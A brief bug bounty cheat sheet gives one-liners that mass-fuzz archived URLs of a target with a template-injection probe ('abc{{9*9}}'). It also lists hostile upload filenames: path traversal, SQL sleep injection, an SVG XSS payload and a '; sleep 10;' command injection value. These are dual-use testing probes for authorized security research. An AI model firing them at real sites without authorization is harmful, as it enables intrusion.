# Bug Bounty Tips File -3
## SSTI to RCE oneliner check
```sh
 waybackurls http://target.com | qsreplace "abc{{9*9}}" > fuzz.txt
 ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/
 ```
 ```sh
 waybackurls https://abc.com | grep '=' | qsreplace "abc{{9*9}}"  | httpx -match-regex 'abc81' -threads 300 -http-proxy http://127.0.0.1:8080/
 ```
search: abc81 in burpsuite search and check
## Chaining file uploads with other vulns:-
 Set filename to:- 
`../../../tmp/lol.png` for path traversals
`sleep(10)-- -.jpg` for SQLi.
`<svg onload=alert(document.comain)>.jpg/png` for xss
`; sleep 10;` for command injections
## 
